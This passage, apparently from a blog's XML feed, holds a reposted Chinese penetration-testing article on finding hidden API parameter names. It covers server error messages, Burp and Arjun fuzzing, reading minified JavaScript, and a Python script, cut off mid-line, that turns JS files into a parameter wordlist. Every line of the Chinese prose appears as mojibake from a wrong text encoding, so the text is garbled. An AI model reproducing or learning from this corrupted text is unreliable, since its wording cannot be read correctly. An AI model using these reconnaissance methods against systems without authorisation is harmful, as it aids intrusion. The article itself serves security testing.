ï¼Œç„¶åå°†å…¶è½¬æ¢ä¸º.p12è¯ä¹¦ï¼Œå¹¶å¯¼å…¥åˆ°æŠ“åŒ…å·¥å…·ä¸­è¿›è¡ŒæŠ“åŒ…ã€‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŠ“åŒ… </tag>
            
            <tag> Android </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>src-æ¸—é€ä¸­åº”è¯¥å¦‚ä½•å¯»æ‰¾å‚æ•°çš„è››ä¸é©¬è¿¹</title>
      <link href="/2024/09/22/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E5%8F%82%E6%95%B0%E7%9A%84%E8%9B%9B%E4%B8%9D%E9%A9%AC%E8%BF%B9/"/>
      <url>/2024/09/22/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E5%8F%82%E6%95%B0%E7%9A%84%E8%9B%9B%E4%B8%9D%E9%A9%AC%E8%BF%B9/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>æ–‡ç« æ¥æºäºï¼š<a href="https://mp.weixin.qq.com/s/pgJbSV0lJ7umdYomNV1xbQ">https://mp.weixin.qq.com/s/pgJbSV0lJ7umdYomNV1xbQ</a></p><p>ä»¥ä¸‹æ–‡ç« æ¥æºäºHWä¸“é¡¹è¡ŒåŠ¨å°ç»„ ï¼Œä½œè€…L@2uR1te</p><h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h2><p>å¹³å¸¸åœ¨åšæµ‹è¯•çš„æ—¶å€™ï¼Œæ‹¿åˆ°ç«™ç‚¹å‰æœŸæœ€ç»ˆçš„ä¸€ä¸ªäº‹æƒ…ï¼Œå°±æ˜¯æ‰¾ä¸€ä¸‹å‰ç«¯JSä¸­æ˜¯ä¸æ˜¯æœ‰ä¸€äº›æ•æ„Ÿçš„æ¥å£ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯æœ‰æœªæˆæƒå’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²çš„é—®é¢˜ã€‚ä½†æ˜¯ï¼Œåªæ˜¯æ‰¾åˆ°æ¥å£ï¼Œå°†å¯¹åº”æ¥å£å’ŒåŸŸåæ‹¼æ¥å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ˜¯è¿”å›405æˆ–è€…æŠ¥é”™çš„ã€‚è¿™æ˜¯å› ä¸ºï¼Œéœ€è¦æ¥å£çš„è°ƒç”¨æ˜¯éœ€è¦å‚æ•°çš„ã€‚ä½†åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼ŒJSä¸­æ˜¯ä¸ä¼šå°†å‚æ•°å’Œæ¥å£ä¸€ä¸€å¯¹åº”å†™å¥½çš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯¹æ¥å£çš„æµ‹è¯•ä¸€ä¸ªç»•ä¸å¼€çš„é—®é¢˜å°±æ˜¯â€”â€”æˆ‘ä»¬åº”è¯¥å¦‚ä½•å¯»æ‰¾å‚æ•°çš„è››ä¸é©¬è¿¹ï¼Ÿ</p><h2 id="0x02-æ‰¾ä¸åˆ°å‚æ•°-ç—›è‹¦é¢å…·"><a href="#0x02-æ‰¾ä¸åˆ°å‚æ•°-ç—›è‹¦é¢å…·" class="headerlink" title="0x02 æ‰¾ä¸åˆ°å‚æ•°~ç—›è‹¦é¢å…·"></a>0x02 æ‰¾ä¸åˆ°å‚æ•°~ç—›è‹¦é¢å…·</h2><p>å¼€å§‹ä¹‹å‰è¿˜æ˜¯å…ˆæ¥çœ‹çœ‹æ‰¾ä¸åˆ°å‚æ•°æ˜¯æ€æ ·çš„æƒ…å†µã€‚æˆ‘ä»¬æ¥æ¨¡æ‹Ÿä¸€ä¸‹å¹³æ—¶æµ‹è¯•çš„æµç¨‹ã€‚</p><p>æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªæ¥å£ï¼Œå…ˆä»¥GETå»è®¿é—®ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221801295.png" alt="image.png"> </p><p>ä¸€èˆ¬ä¼šæç¤º405ï¼Œæˆ–è€…å›æ˜¾GET not supportedï¼Œå°±æ˜¯è¯·æ±‚æ–¹å¼ä¸å¯¹ã€‚é‚£æˆ‘ä»¬æ”¹æˆPOSTæˆ–è€…å…¶å®ƒè¯·æ±‚æ–¹å¼è¯•è¯•ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221801157.png" alt="image.png"> </p><p>æ­¤æ—¶ï¼Œå¦‚æœå‡ºç°415é”™è¯¯ï¼Œæˆ–è€…å›æ˜¾<code>application/x-www-form-urlencoded Not supported</code>ï¼Œé‚£å°±éœ€è¦æ¢ä¸€ä¸‹Content-Typeï¼Œç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œåªéœ€è¦æ”¹æˆ<code>application/json</code>ï¼Œå¹¶åŠ ä¸Šjsonè¯·æ±‚ä½“å³å¯ï¼Œæå°‘æ•°æƒ…å†µä¸‹é‡åˆ°è¿‡xmlä¼ å‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221802352.png" alt="image.png"> </p><p>ç„¶åï¼Ÿç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼Œè¿™ä¸‹ï¼Œä»å“åº”ä¸­æˆ‘ä»¬å¹¶ä¸èƒ½æ¨æ–­å‡ºè‡ªå·±ä¸‹ä¸€æ­¥è¦å¹²ä»€ä¹ˆï¼Œå½“ç„¶è¿™é‡Œè¿˜æœ‰å¯èƒ½å‡ºç°å„ç§å¥‡å¥‡æ€ªæ€ªçš„å¼‚å¸¸å’Œå›æ˜¾ï¼Œæ¯”å¦‚å‚æ•°ç¼ºå¤±ã€å‚æ•°éªŒè¯å¤±è´¥ç­‰ç­‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221802938.png" alt="image.png"> </p><p>æ€»ä¹‹ï¼Œæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå»å¯»æ‰¾å‚æ•°å‘¢ï¼Ÿ</p><h2 id="0x03-åŸºäºå¿ƒå–„çš„å¼€å‘è€…å¯»æ‰¾å‚æ•°"><a href="#0x03-åŸºäºå¿ƒå–„çš„å¼€å‘è€…å¯»æ‰¾å‚æ•°" class="headerlink" title="0x03 åŸºäºå¿ƒå–„çš„å¼€å‘è€…å¯»æ‰¾å‚æ•°"></a>0x03 åŸºäºå¿ƒå–„çš„å¼€å‘è€…å¯»æ‰¾å‚æ•°</h2><p>åœ¨æ­£å¼å¼€å§‹ä»‹ç»å¯»æ‰¾å‚æ•°çš„æ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬æ¥ä»‹ç»å¦ä¸€ç§æƒ…å†µã€‚é‚£å°±æ˜¯åœ¨ä¸€éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œä½ è°ƒç”¨ä¸€ä¸ªæ¥å£å¹¶ä¸”æ²¡æœ‰ä¼ å…¥å‚æ•°ï¼Œå¥½å¿ƒçš„å¼€å‘è€…ä¼šå‘Šè¯‰ä½ ç¼ºäº†ä»€ä¹ˆå‚æ•°ï¼Œå¯¹JAVAå¼€å‘æ¯”è¾ƒç†Ÿæ‚‰çš„å°ä¼™ä¼´éƒ½çŸ¥é“ï¼Œåœ¨Springä¸­æœ‰ä¸€ä¸ª@ValidatedéªŒè¯æ³¨è§£ï¼Œå¯ä»¥å’Œ@NotNullã€@NotBlankç­‰æ³¨è§£ä¸€èµ·ä½¿ç”¨ï¼Œå»åˆ¤æ–­å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œå¹¶è¿”å›ä¸€äº›ä¿¡æ¯ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221803798.png" alt="image.png"> </p><p>æ¯”å¦‚è¿™é‡Œå°±å¯¹UserDTOåšäº†ä¸€ä¸ªç»‘å®šï¼Œç„¶ååœ¨UserDTOä¸­å°±å¯ä»¥åˆ¤æ–­æŸä¸ªå±æ€§æ˜¯å¦ä¸ºç©ºï¼Œè¿™é‡Œå¯ä»¥æ³¨æ„åˆ°ï¼Œåˆ¤æ–­ä¹‹åè¿˜å¯ä»¥è¿”å›messageã€‚å› æ­¤å¦‚æœå¼€å‘è€…å¥½å¿ƒï¼Œè¿™ä¸ªåœ°æ–¹ä¼šæŠ›å‡ºä¸€äº›UserDTOä¸­çš„å±æ€§åã€‚è¿™æ ·æˆ‘ä»¬å°±çŸ¥é“è¦ä¼ å…¥ä»€ä¹ˆå‚æ•°äº†ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221803630.png" alt="image.png"> </p><p>ä¾‹å¦‚ä¸‹é¢è¿™æ ·ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221804061.png" alt="image.png"> </p><p>æœ‰æ—¶å€™åç«¯è™½ç„¶ç»™æˆ‘ä»¬æŠ›å‡ºäº†å‚æ•°ä¿¡æ¯ï¼Œä½†å¯èƒ½æ˜¯å’Œå¼‚å¸¸å †æ ˆæˆ–è€…å…¶ä»–é”™è¯¯ä¿¡æ¯ä¸€èµ·ç»™å‡ºçš„ï¼Œå¹¶ä¸èƒ½ä¸€çœ¼çœ‹å‡ºéœ€è¦çš„å‚æ•°ï¼Œè¿™æ—¶å€™éœ€è¦ç»†å¿ƒã€‚è¿™ä¸ªä¹Ÿç®—æ˜¯ç»å¸¸é‡åˆ°çš„æƒ…å†µã€‚</p><p>è¿™ç§ä¸€èˆ¬æœ‰ä¸‰ç§æƒ…å†µï¼Œ<strong>ä¸€ç§</strong>æ˜¯åç«¯ä¸€ä¸ªä¸ªæŠ›å‡ºç¼ºå¤±çš„å‚æ•°ï¼Œæ¯”å¦‚æˆ‘ä»¬åŠ ä¸€ä¸ªAå‚æ•°ï¼Œåç«¯å‘Šè¯‰æˆ‘ä»¬ç¼ºäº†Bå‚æ•°ï¼Œæˆ‘ä»¬å†è¡¥ä¸€ä¸ªBå‚æ•°ï¼Œåç«¯åˆå‘Šè¯‰æˆ‘ä»¬ç¼ºäº†Cå‚æ•°â€¦ä»¥æ­¤ç±»æ¨ã€‚<strong>å¦ä¸€ç§</strong>åˆ™æ˜¯åç«¯ä¸€å£æ°”å‘Šè¯‰ç¼ºäº†Aã€Bã€Cå‚æ•°ã€‚ä¸Šè¿°è¿™ä¸¤ç§éƒ½å±äºå¯¹æ”»å‡»è€…å¾ˆå‹å¥½çš„ï¼Œ<strong>ç¬¬ä¸‰ç§æƒ…å†µ</strong>ç›¸å¯¹æ²¡é‚£ä¹ˆå‹å¥½ï¼Œé‚£å°±æ˜¯åç«¯åªæ¨¡ç³Šçš„è¯´äº†ä¸€ä¸‹éœ€è¦çš„å‚æ•°çš„å«ä¹‰ï¼Œæ¯”å¦‚æˆ‘ä¸‹é¢è¿™ä¸ªæ¥å£ï¼š</p><p><a href="http://api.test.com/api/getuserinfo">http://api.test.com/api/getuserinfo</a></p><p>è®¿é—®åç«¯æç¤ºï¼Œç¼ºå°‘ç”¨æˆ·idã€‚è¿™ç§æ—¶å€™æˆ‘ä»¬è™½ç„¶ä¸çŸ¥é“å‚æ•°çš„å…·ä½“å€¼ï¼Œä½†æ˜¯æ˜¯èƒ½å¾ˆå¤§ç¨‹åº¦ä¸Šç¼©å°èŒƒå›´çš„ï¼Œæ¯”å¦‚å¦‚ä¸‹å‡ ä¸ªå¸¸è§çš„ç”¨æˆ·idå‚æ•°ï¼š</p><p>idã€useridã€user_idã€uidã€userIdç­‰</p><p>éƒ¨åˆ†åŠŸèƒ½çš„æ¥å£çš„å‚æ•°åä¹Ÿç›¸å¯¹æ¯”è¾ƒå›ºå®šï¼Œæ¯”å¦‚æ–‡ä»¶ä¸Šä¼ æ¥å£ï¼Œæ–‡ä»¶ä¸Šä¼ è¡¨å•çš„å‚æ•°åä¸€èˆ¬å°±æ˜¯fileæˆ–è€…filesï¼Œå®é™…ä¸Šé€šè¿‡è§‚å¯Ÿæ¥å£åå­—ï¼Œèƒ½å¤Ÿæ¨æ–­å‡ºå®ƒè¦å®ç°çš„æ˜¯ä»€ä¹ˆåŠŸèƒ½ï¼Œæ˜¯é’ˆå¯¹ä»€ä¹ˆå¯¹è±¡å®ç°çš„ï¼Œæœ‰æ—¶å€™ç¡®å®èƒ½æ¨æ–­å‡ºä¸€äº›å‚æ•°ã€‚</p><p>é‚£ä¹ˆå›å½’æ­£é¢˜ï¼Œä¸Šé¢æˆ‘ä»¬ä»‹ç»äº†å¼€å‘è€…å¿ƒå–„ï¼Œèµå®‰å…¨ä»ä¸šè€…é¥­åƒçš„åœºæ™¯ï¼Œåœ¨ä¸Šè¿°æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥å¿«é€Ÿè€Œç²¾ç¡®åœ°è·å–åˆ°ç¼ºå¤±çš„å‚æ•°åã€‚è¿™å®é™…ä¸Šéƒ½ç®—ä¸ä¸Šå¯»æ‰¾å‚æ•°ï¼Œå› ä¸ºå¯¹é¢å·²ç»å‘Šè¯‰æˆ‘ä»¬äº†ã€‚é‚£æˆ‘ä»¬å°±å‡è®¾ä¸€ä¸ªæœ€ä¸¥å³»çš„åœºæ™¯ï¼Œåç«¯å°±æ˜¯æ²¡æœ‰ä»»ä½•æç¤ºï¼Œä¸¥æ ¼éµå¾ªä¸Šæ–‡æ¼”ç¤ºè¿‡çš„æƒ…å†µï¼Œæˆ‘ä»¬åˆåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><h2 id="0x04-é€šè¿‡å¸¸è§„å‚æ•°å­—å…¸è¿›è¡Œå‚æ•°åFUZZ"><a href="#0x04-é€šè¿‡å¸¸è§„å‚æ•°å­—å…¸è¿›è¡Œå‚æ•°åFUZZ" class="headerlink" title="0x04 é€šè¿‡å¸¸è§„å‚æ•°å­—å…¸è¿›è¡Œå‚æ•°åFUZZ"></a>0x04 é€šè¿‡å¸¸è§„å‚æ•°å­—å…¸è¿›è¡Œå‚æ•°åFUZZ</h2><p>åœ¨ä¸Šè¿°æƒ…å†µä¸‹ï¼Œç¬¬ä¸€ä¸ªæ¯”è¾ƒå¸¸è§„çš„ææ³•å°±æ˜¯å‚æ•°åFUZZ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221805280.png" alt="image.png"> </p><p>Burpæ ‡è®°å‚æ•°åéƒ¨åˆ†ï¼Œç”¨å­—å…¸å»è·‘å³å¯ï¼Œè¿™ç§æ‰‹æ³•æ¯”è¾ƒä¾èµ–å­—å…¸çš„å¼ºåº¦ï¼Œå‚æ•°åå­—å…¸githubä¸Šèƒ½æ‰¾åˆ°éå¸¸å¤šï¼Œå¸ˆå‚…ä»¬ç»¼åˆç€ä½¿ç”¨å°±è¡Œã€‚è¿™ç§æ‰‹æ³•æœ‰ä¸€ä¸ªæ˜¾è‘—çš„é—®é¢˜æ˜¯ï¼Œå¦‚æœç›®æ ‡éœ€è¦çš„å‚æ•°å¤ªå¤šï¼Œå®é™…ä¸Šå¾ˆéš¾ç”¨è¿™ç§æ–¹æ³•å»æ‰¾å‚æ•°æ•ˆç‡å¾ˆä½ã€‚æœ‰æ—¶å€™æˆ‘ä»¬æ‰¾åˆ°ä¸€äº›å…³é”®çš„å‚æ•°ï¼Œå¯èƒ½æ¥å£å°±èƒ½ç”¨äº†ã€‚æ¯”å¦‚æŸ¥è¯¢ç±»æ¥å£ï¼Œä¸€èˆ¬æœ‰ä¸€ä¸ªqueryã€qä¹‹ç±»çš„å‚æ•°ï¼Œä¼ å…¥è¦æŸ¥è¯¢çš„ä¿¡æ¯ï¼Œè™½ç„¶è¿™ä¸ªæ¥å£å¯èƒ½è¿˜æœ‰pageSizeã€Limitã€Orderç­‰çº¦æŸæ¡ä»¶ä½œä¸ºå‚æ•°ï¼Œä½†æ˜¯ä¸ä¸€å®šè¦ä¼ å…¥ã€‚è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬æ‰¾å‡ºä¸€ä¸ªqueryå‚æ•°å°±èƒ½æ„‰å¿«è°ƒç”¨äº†ã€‚ä½†æ˜¯å¦‚æœå¼€å‘è€…è¿‡äºä¸¥å‰ï¼Œå¿…é¡»å¾—ä¼ å…¥æ‰€æœ‰å‚æ•°æ‰èƒ½è°ƒç”¨ï¼Œé‚£å°±å¾ˆéš¾å—äº†ã€‚</p><p>å› æ­¤é™¤äº†Burpï¼Œè¿˜æœ‰ä¸€äº›ä¸“é—¨ç”¨äºå‚æ•°åFUZZçš„å·¥å…·ï¼Œå¯ä»¥åº”å¯¹ä¸€ä¸‹æˆ‘ä»¬ä¸Šè¿°æåˆ°çš„æƒ…å†µï¼Œæ¯”å¦‚Arjunï¼Œè¿™ä¸ªå·¥å…·çš„ç”¨æ³•å°±ç•™ç»™å„ä½å¸ˆå‚…è‡ªå·±æ‘¸ç´¢å§ã€‚</p><h2 id="0x05-é€šè¿‡â€œæƒ³å½“ç„¶â€æ³•ä»JSå‰åæ–‡ä¸­å¯»æ‰¾å‚æ•°å"><a href="#0x05-é€šè¿‡â€œæƒ³å½“ç„¶â€æ³•ä»JSå‰åæ–‡ä¸­å¯»æ‰¾å‚æ•°å" class="headerlink" title="0x05 é€šè¿‡â€œæƒ³å½“ç„¶â€æ³•ä»JSå‰åæ–‡ä¸­å¯»æ‰¾å‚æ•°å"></a>0x05 é€šè¿‡â€œæƒ³å½“ç„¶â€æ³•ä»JSå‰åæ–‡ä¸­å¯»æ‰¾å‚æ•°å</h2><p>é™¤äº†è¿™æ ·å‚»å‚»çš„å»FUZZå‚æ•°åï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•èƒ½æ¯”è¾ƒç›´ç™½åœ°è·å–åˆ°å‚æ•°å‘¢ï¼Ÿå½“ç„¶æ˜¯æœ‰çš„ï¼Œæ—¢ç„¶ç½‘ç«™çš„åŠŸèƒ½è¦æ­£å¸¸è°ƒç”¨è¿™äº›æ¥å£ï¼Œè¯´æ˜å…³é”®çš„å‚æ•°è‚¯å®šä¹Ÿå†™åœ¨JSé‡Œäº†ï¼Œæˆ‘ä»¬å‰æ–‡æåˆ°çš„å„ç§å·¥å…·éƒ½ä¼šå‘Šè¯‰ä½ æå–çš„æ¥å£å‡ºè‡ªå“ªä¸ªJSæ–‡ä»¶ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221805769.png" alt="img"> </p><p>é‚£æˆ‘ä»¬å°±ç‚¹è¿›å¯¹åº”jsæ–‡ä»¶ï¼Œæœç´¢éƒ¨åˆ†æ¥å£uriï¼Œå»å®šä½å‰åæ–‡ã€‚</p><p>æ¯”å¦‚ä¸Šé¢çš„æ¥å£dev-api&#x2F;system&#x2F;pass&#x2F;get&#x2F;email&#x2F;code</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806608.png" alt="img"> </p><p>è¿™é‡Œä¹Ÿæ˜¯æˆåŠŸå®šä½åˆ°äº†ã€‚ç„¶åä½ ä¼šé—®ï¼Œæˆ‘çœ‹ä¸æ‡‚è¿™ä¹ˆå¤æ‚çš„JSï¼Œæ˜¯ä¸æ˜¯å°±å¯„äº†ï¼Ÿå…¶å®ä¸æ˜¯ï¼Œè¿™ç§çº¯é çŒœå’Œâ€œæƒ³å½“ç„¶â€å°±èƒ½æ‹¿ä¸‹äº†ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æ”¾å¤§æ¥çœ‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806793.png" alt="img"> </p><p>å…ˆç¦»ä»–æœ€è¿‘çš„ï¼Œæ˜¯ä¸æ˜¯å°±æŒ‡ç¤ºäº†å®ƒçš„ä¼ å‚æ˜¯getæ¨¡å¼ã€‚Okï¼Œç°åœ¨çŸ¥é“ä¼ å‚ç±»å‹äº†ã€‚é‚£ä¹ˆå‚æ•°åå‘¢ï¼Ÿæˆ‘ä»¬è¿˜æ˜¯åœ¨è¿™ä¸ªæ¥å£çš„å‘¨å›´å»çœ‹ï¼Œå‘ç°ç¦»ä»–æœ€è¿‘çš„æœ‰ä¸ªè¿™ä¸ª</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806711.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806435.png" alt="img"> </p><p>æ³¨æ„çœ‹è¿™å‡ ä¸ªä¸œè¥¿ï¼ŒuserNameã€tenantCodeã€codeã€newPasswordï¼Œè¿™å‡ ä¸ªä¸œè¥¿æ˜¯ä¸æ˜¯å°±ç‰¹åˆ«åƒå‚æ•°åï¼Ÿé‚£æˆ‘ä»¬ç›´æ¥æ¥è¯•ä¸€è¯•ï¼Œé¦–å…ˆä¸å¸¦å‚æ•°è®¿é—®</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806380.png" alt="img"> </p><p>é‚£ä¹ˆåŠ ä¸Šåˆšåˆšçš„å‚æ•°å‘¢ï¼Ÿ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221807531.png" alt="img"> </p><p>è™½ç„¶å¯èƒ½å› ä¸ºä¸€äº›å‚æ•°å€¼æ²¡å†™å¥½ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰è°ƒç”¨æˆåŠŸï¼Œä½†é€šè¿‡è¿”å›ç»“æœçš„å˜åŒ–ï¼Œè¯´æ˜æˆ‘ä»¬å·²ç»æ‰¾å¯¹å‚æ•°åäº†ï¼Œåç»­å†FUZZå‚æ•°å€¼å³å¯ã€‚æˆ‘ä»¬å†å¤šæ¥å‡ ä¸ªä¸åŒä½†æ˜¯ç±»ä¼¼çš„æƒ…å†µã€‚</p><p>å‡è®¾ç°åœ¨åˆæ‰¾åˆ°ä¸€ä¸ªæ¥å£&#x2F;wxpublic&#x2F;authï¼Œåˆæ²¡æœ‰å‚æ•°ï¼Œé‚£ä¹ˆè¿˜æ˜¯è€æ ·å­ï¼Œè¿›jså»æœè¿™ä¸ªæ¥å£</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221807878.png" alt="img"> </p><p>æ‰¾åˆ°ï¼Œç„¶åè¿˜æ˜¯çœ‹å®ƒå‰åæ–‡å‘—ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221807101.png" alt="img"> </p><p>è¿™å‡ ä¸ªä»€ä¹ˆauthorizerAppIdã€compaanyIdã€scopeã€redirectï¼Œéƒ½çœ‹èµ·æ¥å¾ˆåƒå‚æ•°å•Šï¼Œæˆ‘ä»¬å‰é¢è¯´è¿‡ï¼Œè¿™äº›ç–‘ä¼¼å‚æ•°çš„ï¼Œé‚£ç›´æ¥å…¨éƒ¨ä¸€è‚¡è„‘å†™ä¸Šå‘—ï¼Œå¤šæ‰¾å‡ ä¸ªå¤šå†™å‡ ä¸ªåˆä¸ä¼šæ‰å—è‚‰ï¼Œé‚£ç°åœ¨æˆ‘ä»¬å°è¯•ä¸€ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221807258.png" alt="img"> </p><p>å¯ä»¥çœ‹åˆ°æ¥å£å·²ç»æˆåŠŸè°ƒç”¨äº†ï¼Œæˆ‘ä»¬æ‰¾çš„å‚æ•°æ²¡é—®é¢˜ï¼</p><p>æ€»ä¹‹ï¼Œä¸€ä¸ªæ¯”è¾ƒæœ‰æ•ˆçš„å¯»æ‰¾å‚æ•°åçš„æ–¹æ³•å°±æ˜¯å›åˆ°JSåŸæ–‡ï¼Œå…ˆå®šä½åˆ°æ¥å£åœ¨JSä»£ç ä¸­çš„ä½ç½®ï¼Œå†å»åˆ†æå…¶å‰åæ–‡ï¼Œå¯»æ‰¾ä¸€äº›æ¯”è¾ƒç±»ä¼¼å‚æ•°åçš„å­—ç¬¦ä¸²ï¼Œç„¶åå°è¯•å»æµ‹è¯•å³å¯ã€‚</p><h2 id="0x06-å°†JSæ‹†åˆ†æˆå¤§å­—å…¸è¿›è¡Œå‚æ•°FUZZ"><a href="#0x06-å°†JSæ‹†åˆ†æˆå¤§å­—å…¸è¿›è¡Œå‚æ•°FUZZ" class="headerlink" title="0x06 å°†JSæ‹†åˆ†æˆå¤§å­—å…¸è¿›è¡Œå‚æ•°FUZZ"></a>0x06 å°†JSæ‹†åˆ†æˆå¤§å­—å…¸è¿›è¡Œå‚æ•°FUZZ</h2><p>ä¸Šé¢æˆ‘ä»¬ä»‹ç»äº†é€šè¿‡åˆ†æJSå‰åæ–‡å»å¯»æ‰¾å‚æ•°åï¼Œä½†æ˜¯æœ‰äº›æ—¶å€™ï¼Œå‚æ•°åå¹¶ä¸ä¼šè€è€å®å®çš„æ”¾åœ¨ç›®æ ‡æ¥å£çš„å‰åæ–‡ï¼Œå„ç§å†™æ³•å’Œé£æ ¼åƒå¥‡ç™¾æ€ªï¼Œæœ‰æ—¶å€™å‚æ•°åç›¸å…³çš„éƒ¨åˆ†å¯èƒ½å’Œæ¥å£ç›¸å…³çš„éƒ¨åˆ†éš”å¾—å¾ˆè¿œï¼Œå¦‚æœJSåŸºç¡€ä¸å¥½æ˜¯å¾ˆéš¾çœ‹å‡ºæ¥çš„ï¼ˆæ›´ä½•å†µè¿™äº›JSä»£ç æ²¡æœ‰æ ¼å¼åŒ–ï¼Œå¯†å¯†éº»éº»çš„æ›´éš¾çœ‹æ‡‚ï¼‰ã€‚</p><p>è¿™ç§æƒ…å†µä¸‹å¯¹äºä¸ä¼šJSçš„ç©å®¶è¿˜æœ‰æ²¡æœ‰ä»€ä¹ˆæ¯”è¾ƒå‹å¥½çš„æ“ä½œå‘¢ï¼Ÿå½“ç„¶æœ‰ï¼Œæ—¢ç„¶å‚æ•°å€¼æ— è®ºå¦‚ä½•ä¹Ÿä¼šåœ¨JSé‡Œï¼Œè¿˜æœ‰ç§åŠæ³•æ˜¯ç²—æš´åœ°æŠŠä½ ä¸‹è½½å›æ¥çš„æ‰€æœ‰JSæ–‡ä»¶æ‰“æ•£æˆå‚æ•°å­—å…¸ï¼Œæ ¸å¿ƒæ­£åˆ™å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">matches = re.findall(r&#x27;[a-zA-Z]+[\w-]*\d*|\d+[\w-]*[a-zA-Z]+|[a-zA-Z]+\.[a-zA-Z]+|\w+\.\d+|[a-zA-Z]+~[a-zA-Z]+|\w+~\d+|\d+-\d+|[a-zA-Z]+-[a-zA-Z]+&#x27;, line)</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨è¿™ä¸ªæ­£åˆ™æ›¿æ¢æˆ‘åœ¨ä¸Šä¸€ç¯‡æ–‡ç« çš„æ–‡æœ«ç»™å‡ºçš„å°è„šæœ¬ä¸­çš„æ­£åˆ™ï¼Œå®ç°æå–å‚æ•°çš„æ•ˆæœï¼Œæ•ˆæœç±»ä¼¼ä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">fileurl=sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">filemkdir=fileurl.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filemkdir):    </span><br><span class="line">    os.makedirs(filemkdir)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get path  + è·¯å¾„åç§°</span></span><br><span class="line">paths=[]</span><br><span class="line"><span class="keyword">for</span> dirpath, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">&#x27;./&#x27;</span>+filemkdir):    </span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> filenames:        </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+filemkdir+<span class="string">&quot;/&quot;</span>+file,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;gb18030&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f2:            </span><br><span class="line">            <span class="keyword">try</span>:                </span><br><span class="line">                line=f2.readlines()                </span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> line:                    </span><br><span class="line">                    line=line.strip(<span class="string">&#x27;\n&#x27;</span>).strip(<span class="string">&#x27;\t&#x27;</span>)                    </span><br><span class="line">                    <span class="comment">#print(line)  </span></span><br><span class="line">                    p = re.findall(<span class="string">r&#x27;[a-zA-Z]+[\w-]*\d*|\d+[\w-]*[a-zA-Z]+|[a-zA-Z]+\.[a-zA-Z]+|\w+\.\d+|[a-zA-Z]+~[a-zA-Z]+|\w+~\d+|\d+-\d+|[a-zA-Z]+-[a-zA-Z]+&#x27;</span>, line)            </span><br><span class="line">                    <span class="comment">#print(p)                    </span></span><br><span class="line">                    <span class="keyword">if</span> p != <span class="literal">None</span>:                        </span><br><span class="line">                        <span class="comment">#print(p)                        </span></span><br><span class="line">                        <span class="keyword">for</span> path <span 